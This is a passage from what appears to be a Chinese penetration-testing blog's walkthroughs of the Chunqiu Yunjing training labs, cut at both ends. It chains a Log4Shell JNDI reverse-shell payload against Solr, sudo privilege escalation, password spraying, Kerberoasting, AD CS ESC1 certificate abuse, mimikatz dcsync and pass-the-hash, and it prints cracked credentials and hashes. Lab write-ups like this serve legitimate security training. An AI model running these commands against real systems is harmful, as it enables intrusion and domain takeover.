src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126172919.png"></p><p>在漏洞点执行payload,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/solr/admin/cores?action=$&#123;jndi:ldap://vps:1389/Basic/ReverseShell/vps/9999&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126181240.png"></p><p>payload执行后，就得到shell<br>直接查看flag是没有权限的，想办法提权，尝试suid提权，没什么能利用的<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126173754.png"><br>使用sudo -l 发现有一个grc可以用。<br><code>sudo grc --pty /bin/bash</code>提权<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126174821.png"></p><p>查看flag<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126174837.png">flag{86c36589-ad98-418b-87ea-a7383c2e0fa4</p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>服务器开启http服务</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126175546.png"></p><p>在机器上上传fscan chisel<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126175739.png"><br>添加执行权限<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126175812.png"></p><p>查看机器的内网ip,为172.22.9.19<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126175902.png"></p><p>fscan扫描内网</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">./fscan -h 172.22.9.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.9.19     is alive</span><br><span class="line">(icmp) Target 172.22.9.7      is alive</span><br><span class="line">(icmp) Target 172.22.9.26     is alive</span><br><span class="line">(icmp) Target 172.22.9.47     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.9.7:80 open</span><br><span class="line">172.22.9.47:22 open</span><br><span class="line">172.22.9.47:21 open</span><br><span class="line">172.22.9.19:80 open</span><br><span class="line">172.22.9.19:22 open</span><br><span class="line">172.22.9.47:80 open</span><br><span class="line">172.22.9.47:445 open</span><br><span class="line">172.22.9.26:445 open</span><br><span class="line">172.22.9.7:445 open</span><br><span class="line">172.22.9.26:135 open</span><br><span class="line">172.22.9.26:139 open</span><br><span class="line">172.22.9.47:139 open</span><br><span class="line">172.22.9.7:139 open</span><br><span class="line">172.22.9.7:135 open</span><br><span class="line">172.22.9.7:88 open</span><br><span class="line">172.22.9.19:8983 open</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.26</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]DESKTOP-CBKTVMO</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.9.26</span></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.7</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]XIAORANG-DC</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.9.7</span></span><br><span class="line">[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] NetBios 172.22.9.7      [+] DC:XIAORANG\XIAORANG-DC    </span><br><span class="line">[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] NetBios 172.22.9.47     fileserver                          Windows 6.1</span><br><span class="line">[*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/</span><br><span class="line">[*] OsInfo 172.22.9.47  (Windows 6.1)</span><br><span class="line">[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin</span><br><span class="line">[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">已完成 15/16 [-] ftp 172.22.9.47:21 ftp ftp123 530 Login incorrect. </span><br></pre></td></tr></table></figure><p>得到内网信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.9.7 DC</span><br><span class="line">172.22.9.19  已拿下</span><br><span class="line">172.22.9.26   域内用户</span><br><span class="line">172.22.9.47  fileserver</span><br><span class="line">  </span><br><span class="line">172.22.9.13 XIAORANG\CA01 证书服务器  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p>服务端监听<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126181445.png"><br>内网机器执行<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126181508.png"><br>这样搭建代理就成功了</p><h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><p>因为题目提示的有SMB，且47这台机器是fileserver<br>尝试连接，成功连接<br>proxychains smbclient \\172.22.9.47\fileshare<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126182754.png"></p><p>查看目录下有个secret文件，进去之后找到flag02</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126183244.png"></p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126183300.png"></p><h2 id="flag03-flag04"><a href="#flag03-flag04" class="headerlink" title="flag03&amp;flag04"></a>flag03&amp;flag04</h2><p>除了flag文件，还有个数据库文件，下载出来查看</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126183426.png"></p><p>发现有两个表，一个有密码，一个有域内用户名</p><p>密码<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126185002.png"></p><p>用户名<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126184945.png"></p><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>使用kerbrute枚举出有效用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 172.22.9.7 -d xiaorang.lab user.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126204641.png"></p><p>得到有效用户后，密码喷洒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 172.22.9.7 -d xiaorang.lab user1.txt fiAzGwEMgTY</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126204801.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 172.22.9.7 -d xiaorang.lab user1.txt i9XDE02pLVf</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126204832.png"></p><p>得到用户密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangjian:i9XDE02pLVf</span><br><span class="line">liupeng:fiAzGwEMgTY</span><br></pre></td></tr></table></figure><p>直接rdp登陆不成功</p><p><strong>其他密码喷洒方式</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb  172.22.9.26 -u user.txt -p pass.txt</span><br><span class="line">或者</span><br><span class="line">proxychains4 hydra -L user.txt -P pass.txt 172.22.9.26 rdp &gt;&gt;result.txt</span><br></pre></td></tr></table></figure><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>查找域用户下的spn<br>因为题目flag01提示的有SPN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SPN，ServicePrincipal Names，即服务主体名称，是服务实例（比如：HTTP、SMB、MySQL等服务）在使用 Kerberos 身份验证的网络上的唯一标识符，其由服务类、主机名和端口组成</span><br><span class="line">SPN 分为两种类型：一种是注册在活动目录的机器帐户（Computers）下。当一个服务的权限为 Local System 或 Network Service 时，则 SPN 注册在机器帐户（Computers）下。另一种是注册在活动目录的域用户帐户（Users）下，当一个服务的权限为一个域用户时，则 SPN 注册在域用户帐户（Users）下。</span><br></pre></td></tr></table></figure><p>使用py查找域用户下的spn，<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126205029.png"></p><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>Kerberoasting攻击是在TGS_REP的过程中用户将会收到由目标服务实例的NTLM hash加密生成的ST(service ticket)，加密算法为RC4-HMAC，如果获得这个ST票据，我们可以尝试穷举口令，模拟加密过程，进行破解。</p><p><strong>获取ST票据</strong><br>使用impacket的 GetUserSPNs.py来获得注册在<code>xiaorang.lab\liupeng</code>用户下的SPN的服务票据（ST）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br><span class="line"></span><br><span class="line">proxychains4 python3 GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -request-user chenchen</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126205355.png"></p><p><strong>破解hash</strong><br>hashcat.exe -m 13100 -a 0 hash.txt rockyou.txt –force</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126212921.png"><br>得到服务账户的账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangxia:MyPass2@@6 </span><br><span class="line">chenchen:@Passw0rd@</span><br></pre></td></tr></table></figure><h3 id="AD-CS-攻击"><a href="#AD-CS-攻击" class="headerlink" title="AD CS 攻击"></a>AD CS 攻击</h3><p>利用之前先了解一些相关知识<br>ADCS（Active Directory Certificate Services）是 Windows 服务器的一个重要角色，它为网络中的通信和交易提供了公钥基础设施（PKI）。在网络安全领域，ADCS 也是一个常见的攻击目标，尤其是在配置错误或权限控制不当的情况下。<br><strong>证书</strong><br>证书是一个小文件，此文件包含了公钥信息、拥有者身份信息、以及数字证书认证机构对这份文件的数字签名，以保证这个文件的整体内容正确无误。<br>拥有者凭此文件，可向电脑系统或者其他用户表明身份，从而获得对方的信任并授权访问或使用某些敏感的电脑服务。在证书注册过程中，客户端会生成公钥&#x2F;私钥对，然后客户端将公钥发送到CA，而CA会确认客户端信息，用自己的私钥对其进行签名，随后再将包含客户端公钥的证书发送回客户端。<br><strong>证书模板</strong><br>证书模板定义了用户和设备如何根据模板来请求和使用企业CA颁发的证书。例如你可以创建一个模板来提供文件加密或电子邮件签名功能。CA依赖于ADDS来存储配置的模板。注意，只有在使用企业CA时才可以使用证书模板，这意味着，在使用独立CA时，必须手动创建每个证书请求，并添加需要在证书中包含的必须信息。<br><strong>证书模板错误配置漏洞</strong><br>ESC1: 通过配置错误的证书模板（如 VulnTemplate），允许域用户注册并指定任意的主体替代名称 (SAN)，这可能导致伪装成其他用户（如域管理员）</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>方法一和方法二的区别是方法一通过连接内网的远程桌面，在目标机器上直接上传工具操作，而方法二是用kali通过代理直接操作，使用kali更方便一些。</p><p>可以直接在本机通过proxifier搭全局代理远程桌面连接，我这里是本机远程桌面没登陆成功，所以我通过kali的远程桌面连接内网主机</p><p><strong>远程连接桌面</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 rdesktop 172.22.9.26 -u zhangxia -d xiaorang.lab -p &#x27;MyPass2@@6&#x27; -r disk:share=/home/kali/Desktop</span><br></pre></td></tr></table></figure><p>如果显示版本过老可以使用下面的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 xfreerdp /v:172.22.9.26 /u:zhangxia /d:xiaorang.lab /p:&#x27;MyPass2@@6&#x27; /drive:share,/home/kali/Desktop +clipboard /cert:ignore</span><br></pre></td></tr></table></figure><p>远程桌面连接后，上传cerity和Rubeus工具；工具可以自己编译也可以在下方链接下载<br><a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a></p><p>因为远成登陆后没有管理员权限，无法查看administrator目录下的flag，因此需要尝试获得域管理员权限，题目提示的有AD CS ,因此尝试AD CS攻击</p><p>先使用下面命令检查有没有证书配置错误，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cerity.exe find /vulnerable</span><br><span class="line">或者</span><br><span class="line">certutil -v -template &gt; cert_templates.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126224333.png"></p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250127220200.png"></p><p>当证书配置满足下面三个条件时，就存在<strong>证书模板错误配置漏洞</strong>ESC1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT</span><br><span class="line">表示基于此证书模板申请新证书的用户可以为其他用户申请证书，即任何用户，包括域管理员用户</span><br><span class="line"> </span><br><span class="line">PkiExtendedKeyUsage: Client Authentication</span><br><span class="line">表示将基于此证书模板生成的证书可用于对 Active Directory 中的计算机进行身份验证</span><br><span class="line"> </span><br><span class="line">Enrollment Rights: NT Authority\Authenticated Users</span><br><span class="line">表示允许 Active Directory 中任何经过身份验证的用户请求基于此证书模板生成的新证书</span><br></pre></td></tr></table></figure><p>恰好，该机器满足条件可以利用。</p><h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>通过证书模板为域管申请证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe request /ca:CA01.xiaorang.lab\xiaorang-CA01-CA /template:&quot;XR Manager&quot; /altname:XIAORANG.LAB\Administrator</span><br></pre></td></tr></table></figure><p>然后换算pem到pfx，不要输入密码<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250127192051.png"><br>通过证书请求TGT票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password: /ptt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250127192121.png"><br>导入票据之后,通过dcsync抓取hash,得到管理员hash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; &quot;exit&quot; </span><br></pre></td></tr></table></figure><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>通过kali直接利用找管理员hash<br><strong>下载Certipy</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ly4k/Certipy.git</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><p>查看证书配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy find -u &#x27;liupeng@xiaorang.lab&#x27;  -password &#x27;fiAzGwEMgTY&#x27; -dc-ip 172.22.9.7 -vulnerable -stdout</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250127171359.png"></p><p>满足esc1条件<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250127172139.png"></p><p>为域管申请证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy req -u &#x27;liupeng@xiaorang.lab&#x27; -p &#x27;fiAzGwEMgTY&#x27; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &quot;xiaorang-XIAORANG-DC-CA&quot; -template &#x27;XR Manager&#x27;  -upn administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126223314.png"></p><p>如果在给管理员申请证书时，出现以上的超时，可以把以下的加入host文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">172.22.9.7 XIAORANG-DC.xiaorang.lab</span><br><span class="line">172.22.9.13 CA01.xiaorang.lab</span><br></pre></td></tr></table></figure><p>如果还出现申请不成功，可能是代理链导致请求延迟过高，使用-q 多申请几遍</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q certipy req -u &#x27;liupeng@xiaorang.lab&#x27; -p &#x27;fiAzGwEMgTY&#x27; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &quot;xiaorang-XIAORANG-DC-CA&quot; -template &#x27;XR Manager&#x27;  -upn administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250127173750.png"><br> 使用申请到的证书拿管理员hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy auth -pfx administrator.pfx -dc-ip 172.22.9.7</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250127221924.png"></p><p>以下的操作方法一、二相同<br>得到管理员hash后，横向移动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.9.26 -u administrator -H2f1b57eefb2d152196836b0516abea80 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250127181612.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.9.7 -u administrator -H2f1b57eefb2d152196836b0516abea80 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag04.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250127190505.png"></p><p>##参考链接<br><a href="https://www.kinsomnia.cn/index.php/2024/04/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-certify/">https://www.kinsomnia.cn/index.php/2024/04/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-certify/</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SMB </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> Kerberos </tag>
            
            <tag> Solr </tag>
            
            <tag> AD CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Brute4Road</title>
      <link href="/2025/01/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/"/>
      <url>/2025/01/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/</url>
      
        <content type="html"><![CDATA[<h1 id="Brute4Road"><a href="#Brute4Road" class="headerlink" title="Brute4Road"></a>Brute4Road</h1><p>flag01</p><p>        redis未授权 </p><p>        suid提权<br>flag02  </p><p>        信息收集</p><p>        WPCargo&lt;6.9.0 RCE</p><p>flag03  </p><p>        MSSQL爆破</p><p>        SweetPotato提权</p><p>        内网穿透</p><p>flag04  </p><p>        域内信息收集<br>        约束委派</p><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>fscan扫描存在redis未授权<br>详情看<a href="http://111.229.209.166/2022/06/28/redis%e6%94%bb%e9%98%b2%e7%b3%bb%e5%88%97-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e8%a1%8d%e7%94%9f%e5%88%a9%e7%94%a8/#4.redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6rce">redis未授权</a></p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122151530.png"><br>用kali可以直接redis-cli -h ip 连接redis ，用info查看版本信息</p><p>然后使用<a href="https://github.com/n0b0dyCN/redis-rogue-server%E7%9A%84%E8%84%9A%E6%9C%AC%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6">https://github.com/n0b0dyCN/redis-rogue-server的脚本直接利用redis主从复制</a><br><code>python3 redis-rogue-server.py --rhost 39.99.233.102 --lhost 